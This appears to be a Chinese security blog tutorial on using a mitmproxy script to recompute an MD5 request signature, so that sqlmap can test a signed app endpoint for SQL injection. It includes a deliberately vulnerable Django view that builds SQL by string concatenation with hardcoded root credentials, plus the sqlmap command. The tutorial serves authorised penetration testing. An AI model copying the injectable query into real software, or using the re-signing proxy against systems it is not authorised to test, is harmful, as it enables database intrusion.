我对公司的APP进行测试的时候发现，我们是将所有的参数内容加上一个32位字符最后在进行MD5加密。由于APP处理的流程首先是验证sign是不是正确，如果验签失败，根本就进不去数据库，为了要使用SQLMAP对其进行测试，于是就写了一个代理数据的脚本，在拦截到数据包之后，对其参数内容和32字符进行加密替换。

 **注：该脚本适用于公司内部系统，因为能够知道加密的流程；或者能够拿到前端JS的加密方式。**

首先我使用Django写了一个程序来模拟公司的系统，流程是获取POST的id和token，并加上自定义加密的字符，由于Django获取到数据是已经经过URLDECODE，所以我用了quote对参数id的内容进行URLENCODE，再进行MD5加密，最后验证请求过来的token是否和参数内容一致。

    
    
    views.py
    
    from django.shortcuts import render
    from django.http import JsonResponse
    # Create your views here.
    import hashlib
    import MySQLdb
    import urllib
    from django.views.decorators.csrf import csrf_exempt
    
    @csrf_exempt
    def index(request):
        id = request.POST.get("id")
        token = request.POST.get("token")
        str = urllib.quote(id+"test")
        print(str)
        hl = hashlib.md5()
        hl.update(str)
        token1 = hl.hexdigest()
        print token1
        if token == token1:
            db = MySQLdb.connect("localhost", "root", "123456", "testdb", charset='utf8')
            cursor = db.cursor()
            cursor.execute("select * from t_userinfo where id="+id)
            data = cursor.fetchone()
            print "Database version : %s " % data
            db.close()
            return JsonResponse({"msg":"verity ok"})
        else:
            return JsonResponse({"msg":"verity error."})
    
    
    models.py
    
    class userinfo(models.Model):
        name = models.CharField(max_length=100)
        age = models.CharField(max_length=100)
    
    
    
      
    

使用BP进行抓包，可以看到当验证正确和验证错误返回的状态。

![1111.png](https://image.3001.net/images/20180510/15259452865087.png!small)![222222.png](https://image.3001.net/images/20180510/15259452947198.png!small)

使用SQLMAP进行测试，发现无法测试。  
![3333.png](https://image.3001.net/images/20180510/15259453014577.png!small)于是我使用mitmproxy，mitmproxy是一个交互式的中间代理HTTP和HTTPS的控制台界面，具体详情可以看[这里](http://mitmproxy.readthedocs.io/en/v0.18.2/introduction.html)。

如果要修改的话，只修改wsproxy_request_handle函数，因为这个函数是拦截数据并且篡改数据的过程，其他的代码都是配置过程和运行过程，不用修改。

    
    
    from mitmproxy.proxy.server import ProxyServer
    from mitmproxy import flow,  controller
    from mitmproxy import flow, proxy, controller, options
    import hashlib
    import re
    
    
    def md5cr(str):
        hl = hashlib.md5()
        hl.update(str.encode(encoding='utf-8'))
        return hl.hexdigest()
    
    class WSProxy(flow.FlowMaster):
        def __init__(self, opts, server, state, unsave_data):
            super(WSProxy, self).__init__(opts, server, state)
            self.unsave_data = unsave_data
        def run(self):
            try:
                print("start")
                flow.FlowMaster.run(self)
            except KeyboardInterrupt:
                self.shutdown()
    
        @controller.handler
        def request(self, f):
            wsproxy_request_handle(f)
    
        @controller.handler
        def response(self, f):
            wsproxy_response_handle(f)
            # parser = ResponseParser(f)
            # insert_result(parser.parser_data())
    
    def wsproxy_request_handle(flow):
        """wyproxy send data to server before processing"""
    
        try:
            data = flow.request.content.split("&")
            t = ""
            for i in data:
                if i.split("=")[0] != "token":
                    t = t+i.split("=")[1]
            str = t+"test"
            sign = md5cr(str)
            print(str)
            data1 = re.match("(.*?)token=",flow.request.content).group()
            flow.request.content = data1+sign
            print(flow.request.content)
        except IndexError:
            pass
    
    
    def wsproxy_response_handle(flow):
        pass
    
    port = 8888  #
    mode = 'regular'  #mode=regular
    opts = options.Options(
            listen_port=int(port),
            mode=mode,
            cadir="./ssl/",
    )
    unsave_data = False
    config = proxy.ProxyConfig(opts)
    state = flow.State()
    server = ProxyServer(config)
    m = WSProxy(opts, server, state, unsave_data)
    m.run()
    
    

运行上面的脚本使用SQLMAP代理到上http://IP:8888上面，然后脚本会自动处理sqlmap的payload和生成对应的sign。

    
    
    python sqlmap.py -r e:\\1.txt -p id --dbms=mysql --batch  --proxy=http://192.168.1.240:8888

![QQ截图20180511111123.png](https://image.3001.net/images/20180511/15260083393737.png!small)

上面是生成payload和sign的过程，下面是我请求一个payload报错的过程。

![QQ截图20180511111242.png](https://image.3001.net/images/20180511/15260083823260.png!small)

![QQ截图20180511111329.png](https://image.3001.net/images/20180511/15260084429189.png!small)  

